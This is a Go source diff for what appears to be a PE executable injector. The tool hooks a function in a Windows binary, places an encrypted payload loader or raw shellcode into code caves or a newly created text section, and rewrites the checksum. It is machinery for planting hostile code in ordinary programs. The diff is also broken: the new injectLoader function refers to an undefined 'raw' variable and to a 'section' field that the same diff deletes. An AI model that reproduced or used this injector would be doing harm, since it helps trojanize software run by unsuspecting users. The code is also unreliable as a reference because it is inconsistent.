@@ -57,8 +57,6 @@ const (
 	ModeExtendText   = "extend-text"
 	ModeExtendTextNS = "extend-text_ns"
 	ModeCreateText   = "create-text"
-
-	ModeExtendSection = "extend-section"
 )
 
 var (
@@ -116,10 +114,7 @@ type Injector struct {
 	canTryExtend bool
 
 	// record loader size for process
-	loaderSize int
-
-	// about create section mode
-	section *pe.SectionHeader
+	loaderSize uint32
 
 	// about hook function
 	oriInst [][]byte
@@ -271,6 +266,7 @@ type Context struct {
 	NumCodeCaves  int    `json:"num_code_caves"`
 	NumLoaderInst int    `json:"num_loader_inst"`
 	HookAddress   uint64 `json:"hook_address"`
+	EntryAddress  uint64 `json:"entry_address"`
 }
 
 // NewInjector is used to create a simple PE injector.
@@ -289,9 +285,8 @@ func NewInjector() *Injector {
 	return &injector
 }
 
-// Inject is used to inject payload to a PE image file.
-// It will inject a payload loader to code cave,
-// loader will decrypt and execute the input payload.
+// Inject is used to inject a payload loader to PE image with multi modes,
+// Loader will decrypt and execute or process the input payload.
 func (inj *Injector) Inject(image, payload []byte, opts *Options) (*Context, error) {
 	if len(payload) == 0 {
 		return nil, errors.New("empty payload")
@@ -314,13 +309,14 @@ func (inj *Injector) Inject(image, payload []byte, opts *Options) (*Context, err
 	if err != nil {
 		return nil, fmt.Errorf("failed to build loader: %s", err)
 	}
-	err = inj.inject(loader, false)
+	err = inj.injectLoader(loader)
 	if err != nil {
 		return nil, fmt.Errorf("failed to inject loader: %s", err)
 	}
 	inj.overwriteCheckSum()
 	inj.ctx.Output = inj.dup
 	inj.ctx.Size = int64(len(inj.dup))
+	inj.ctx.Raw = false
 	// record loader assembly
 	binHex, insts := inj.disassembleLoader(loader)
 	inj.ctx.LoaderHex = binHex
@@ -351,8 +347,10 @@ func (inj *Injector) InjectRaw(image []byte, shellcode []byte, opts *Options) (*
 		inj.engine = nil
 	}()
 	// auto append the mark about end of shellcode
-	shellcode = bytes.Clone(shellcode)
-	shellcode = append(shellcode, endOfShellcode...)
+	if !bytes.Contains(shellcode, endOfShellcode) {
+		shellcode = bytes.Clone(shellcode)
+		shellcode = append(shellcode, endOfShellcode...)
+	}
 	// prepare force inject mode
 	opts = inj.opts
 	if opts.ForceCodeCave && opts.ForceCreateText {
@@ -364,13 +362,14 @@ func (inj *Injector) InjectRaw(image []byte, shellcode []byte, opts *Options) (*
 			return nil, err
 		}
 	}
-	err = inj.inject(shellcode, true)
+	err = inj.injectShellcode(shellcode)
 	if err != nil {
 		return nil, fmt.Errorf("failed to inject shellcode: %s", err)
 	}
 	inj.overwriteCheckSum()
 	inj.ctx.Output = inj.dup
 	inj.ctx.Size = int64(len(inj.dup))
+	inj.ctx.Raw = true
 	return inj.ctx, nil
 }
 
@@ -397,7 +396,66 @@ func (inj *Injector) ExtendTextSection(image []byte, size uint32) ([]byte, error
 	return inj.dup, nil
 }
 
-func (inj *Injector) inject(shellcode []byte, raw bool) (err error) {
+func (inj *Injector) injectLoader(loader []byte) (err error) {
+	defer func() {
+		if r := recover(); r != nil {
+			err = errors.New(fmt.Sprint(r))
+		}
+	}()
+	targetRVA, err := inj.selectHookTarget()
+	if err != nil {
+		return err
+	}
+	if targetRVA == 0 {
+		return errors.New("hook target function address is zero")
+	}
+	targetRVA = inj.fuzzHook(targetRVA)
+	first := inj.selectFirstCodeCave(targetRVA)
+	var dstRVA uint32
+	if inj.section != nil {
+		dstRVA = inj.section.VirtualAddress
+	} else {
+		if first == nil {
+			return errors.New("not enough code caves for inject shellcode")
+		}
+		dstRVA = first.va
+	}
+	err = inj.hook(targetRVA, dstRVA)
+	if err != nil {
+		return fmt.Errorf("failed to hook target function: %s", err)
+	}
+	err = inj.slice(loader, raw)
+	if err != nil {
+		return err
+	}
+	if inj.section != nil {
+		inj.ctx.Mode = ModeCreateText
+		inj.padding(loader, targetRVA)
+		return nil
+	}
+	if !raw {
+		return inj.insert(targetRVA, first)
+	}
+	// try to cove cave mode
+	inj.ctx.Mode = ModeCodeCave
+	err = inj.insert(targetRVA, first)
+	if err == nil {
+		return nil
+	}
+	if inj.opts.ForceCodeCave {
+		return err
+	}
+	inj.ctx.Mode = ModeCreateText
+	// if failed, try to use create section mode
+	err = inj.createSectionForRaw(len(loader))
+	if err != nil {
+		return err
+	}
+	inj.padding(loader, targetRVA)
+	return nil
+}
+
+func (inj *Injector) injectShellcode(shellcode []byte) (err error) {
 	defer func() {
 		if r := recover(); r != nil {
 			err = errors.New(fmt.Sprint(r))
@@ -775,7 +833,6 @@ func (inj *Injector) slice(shellcode []byte, raw bool) error {
 	if !raw {
 		inj.ctx.NumLoaderInst = len(segments)
 	}
-	inj.ctx.Raw = raw
 	return nil
 }
 
